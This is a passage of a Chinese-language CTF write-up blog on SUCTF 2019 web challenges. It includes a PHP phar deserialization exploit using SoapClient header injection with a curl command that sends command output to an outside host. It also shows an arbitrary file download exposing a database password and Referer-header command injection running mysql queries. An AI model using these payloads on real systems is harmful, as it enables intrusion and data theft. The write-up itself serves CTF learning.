+<p>结合前面分析的，就是构造一个phar包，其中为File类，File类中的func指向SoapClient，通过SoapClient向<code>admin.php</code>发送请求，调用<code>system()</code>再用curl将数据带出<br>于是构造一下，在反射类那里突然发现好像自己没用过多少类，查了一下用了DateTime类【wtcl</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class File&#123;</span><br><span class="line">    public $file_name;</span><br><span class="line">    public $func = &quot;SoapClient&quot;;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">    	$location = &quot;http://127.0.0.1/admin.php&quot;;</span><br><span class="line">		$uri = &quot;aaa&quot;;</span><br><span class="line">    	$this-&gt;file_name = array(null, array(&apos;user_agent&apos; =&gt; &quot;buu\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:150\r\n\r\nadmin=1&amp;cmd=curl -d &quot;`ls /`&quot; http://ip:port/&amp;clazz=DateTime&amp;func1=modify&amp;func2=format&amp;func3=setTimestamp&amp;arg1=-1 day&amp;arg2=Y-m-d H:i:s&amp;arg3=1536547854&quot;,&apos;location&apos; =&gt; $location,&apos;uri&apos; =&gt; $uri));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$phar = new Phar(&quot;file.phar&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&apos;&lt;script language=&quot;php&quot;&gt;__HALT_COMPILER();&lt;/script&gt;&apos;);</span><br><span class="line">$file = new File();</span><br><span class="line">$phar-&gt;setMetadata($file);</span><br><span class="line">$phar-&gt;addFromString(&quot;1.txt&quot;, &quot;test&quot;); </span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">// curl -d &quot;`ls`&quot; http://ip:port/</span><br><span class="line">// curl http://ip:port/?a=`/readflag`</span><br></pre></td></tr></table></figure>
+<p>然而这个整了一个下午我都没带出数据，把代码部署到自己服务器上尝试可以但buu上就是不行，不知道为什么了Orz</p>
+<p>这里除了用<code>&lt;script&gt;</code>外还可以用<code>GIF89aphp __HALT_COMPILER(); ?&gt;</code>绕过<code>&lt;?</code>的检查，phar包有<code>__HALT_COMPILER(); ?&gt;</code>作为头部的结尾就能使用</p>
+<p>不过这题预期解是要我们用mysqli类</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$m = new mysqli();</span><br><span class="line">$m-&gt;init(); </span><br><span class="line">$m-&gt;real_connect(ip,user,psw,database,3306); </span><br><span class="line">$m-&gt;query(query)</span><br></pre></td></tr></table></figure>
+<p>像这样，通过<code>real_connect()</code>可以将<code>options()</code>的设置覆盖掉，这样就能保证<code>LOAD DATA INFILE</code>能够使用。然后连接上远程的数据库，<code>LOAD DATA INFILE</code>一波完事</p>
+<h2 id="Cocktail’s-Remix"><a href="#Cocktail’s-Remix" class="headerlink" title="Cocktail’s Remix"></a>Cocktail’s Remix</h2><p>这题甚至连docker都没有，也许大佬还要拿来复用？不过最近的比赛好像都没看到的样子，最重要分析的so文件都没有，真的就只能全程脑补了Orz</p>
+<p>扫目录可以扫到<code>robots.txt</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User-agent: * </span><br><span class="line">Disallow: /info.php </span><br><span class="line">Disallow: /download.php </span><br><span class="line">Disallow: /config.php</span><br></pre></td></tr></table></figure>
+<p><code>info.php</code>为phpinfo<br><code>download.php</code>能够下载，但不知道要传入什么。抓包后发现<code>Content-Disposition</code>处有个filename，于是尝试filename传参 </p>
+<p><img src="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/037ee36f681ce5527653bc6f224150bd.png" alt=""></p>
+<p>传入filename发现可以实现任意文件下载<br>于是去拿源码，<code>config.php</code>中给了mysql的账户与密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    //$db_server = &quot;MysqlServer&quot;;</span><br><span class="line">    //$db_username = &quot;dba&quot;;</span><br><span class="line">    //$db_password = &quot;rNhHmmNkN3xu4MBYhm&quot;;    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>拿了其它几个源码没什么用，于是去读phpinfo</p>
+<p><img src="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/3991cefd6baf23dc560d650d503ec6ef.png" alt=""></p>
+<p>在扩展中发现了一个和题目名相似的扩展，于是拿一波<code>/usr/lib/apache2/modules/mod_cocktail.so</code></p>
+<p>so文件分析就只能用大佬们给的图分析了</p>
+<p><img src="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/7b31a7abd55c4184ae5f0724acde38ea.png" alt=""></p>
+<p>可以看到，35行用<code>popen()</code>执行了reffer中命令，猜测应该是在<code>ap_rwrite()</code>处就返回出来了<br>往上找reffer，发现reffer应该是v7经过<code>j_remix()</code>处理后的结果，再往上看v3看起来像头部信息，那v5应该也是头部里的信息。28行将v7与Reffer字符串比较，那应该是通过在头部设置Reffer，将值传给了v7加密后赋给reffer</p>
+<p>然后去读<code>j_remix()</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/c92333620f8df0fb90230d37283ac39e.png" alt=""></p>
+<p>看起来是某种编码，使用IDA的findcrypt插件可以发现有base64表，猜测是base64</p>
+<p>于是利用此处，在头部添加Reffer，并加入base64后的命令。但由于没有权限写webshell，只能通过将mysql的数据输出到文件中再读取文件获得信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">mysql -h MysqlServer -u dba -p rNhHmmNkN3xu4MBYhm -e &quot;show databases;&quot; &gt; /tmp/zero.txt &amp;&amp; cat /tmp/zero.txt &amp;&amp; rm /tmp/zero.txt</span><br><span class="line">mysql -h MysqlServer -u dba -p rNhHmmNkN3xu4MBYhm -e &quot;use flag;show tables;&quot; &gt; /tmp/zero.txt &amp;&amp; cat /tmp/zero.txt &amp;&amp; rm /tmp/zero.txt</span><br><span class="line">mysql -h MysqlServer -u dba -p rNhHmmNkN3xu4MBYhm -e &quot;use flag;select * from flag;&quot; &gt; /tmp/zero.txt &amp;&amp; cat /tmp/zero.txt &amp;&amp; rm /tmp/zero.txt</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/11/30/De1CTF2019-web-wp/" rel="next" title="De1CTF2019 web wp">
+                <i class="fa fa-chevron-left"></i> De1CTF2019 web wp
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="http://shifeng-kaze.cn/blog/head/kotori.jpg" alt="k0t0r1">
+            
+              <p class="site-author-name" itemprop="name">k0t0r1</p>
+              <p class="site-description motion-element" itemprop="description">～いらっしゃいません～</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://shifeng-kaze.cn/" title="shifeng-kaze" target="_blank">shifeng-kaze</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://aluvion.github.io" title="Aluvion" target="_blank">Aluvion</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#CheckIn"><span class="nav-number">1.</span> <span class="nav-text">CheckIn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EasyPHP"><span class="nav-number">2.</span> <span class="nav-text">EasyPHP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pythonginx"><span class="nav-number">3.</span> <span class="nav-text">Pythonginx</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#iCloudMusic"><span class="nav-number">4.</span> <span class="nav-text">iCloudMusic</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easy-sql"><span class="nav-number">5.</span> <span class="nav-text">easy_sql</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Uploads-labs-2"><span class="nav-number">6.</span> <span class="nav-text">Uploads labs 2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cocktail’s-Remix"><span class="nav-number">7.</span> <span class="nav-text">Cocktail’s Remix</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">k0t0r1</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+
+</body>
+</html>
